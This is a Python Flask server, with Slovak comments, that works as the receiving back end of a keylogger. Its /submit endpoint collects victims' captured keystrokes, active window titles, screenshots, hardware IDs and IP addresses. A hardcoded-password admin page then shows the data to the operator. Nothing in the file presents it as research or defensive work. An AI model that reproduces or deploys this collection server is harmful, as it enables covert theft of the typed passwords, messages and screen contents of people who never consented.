from flask import Flask, request, render_template, redirect
from datetime import datetime

app = Flask(__name__)
PASSWORD = "120202810428Jm!"
DATA = []

@app.route('/')
def home():
    return redirect('/admin')

@app.route('/submit', methods=['POST'])
def submit():
    json_data = request.json
    if not json_data:
        return {"status": "error", "message": "No JSON data received"}, 400

    keys_value = json_data.get('keys')

    # Oprava: Ak náhodou keys_value je callable (metóda), prekonvertuj na string
    if callable(keys_value):
        keys_value = str(keys_value)

    # Alebo lepšie, kontroluj typ, nech je to string (bez metód)
    if not isinstance(keys_value, str):
        keys_value = str(keys_value) if keys_value is not None else ""

    print(f"Received keys (type {type(keys_value)}): {keys_value}")
    print(f"Active window: {json_data.get('active_window')}")
    print("Screenshot received" if json_data.get('screenshot') else "Screenshot missing")

    entry = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'user_id': json_data.get('user_id', 'N/A'),
        'hwid': json_data.get('hwid', 'N/A'),
        'ip_address': json_data.get('ip_address', 'N/A'),
        'keys': keys_value,
        'active_window': json_data.get('active_window', 'N/A'),
        'screenshot': json_data.get('screenshot')
    }
    DATA.append(entry)

    return {"status": "received"}

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('password') == PASSWORD:
            return render_template("admin.html", data=DATA)
        else:
            return render_template("login.html", error="Zlé heslo")
    return render_template("login.html")

@app.route('/logout')
def logout():
    return redirect('/admin')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)








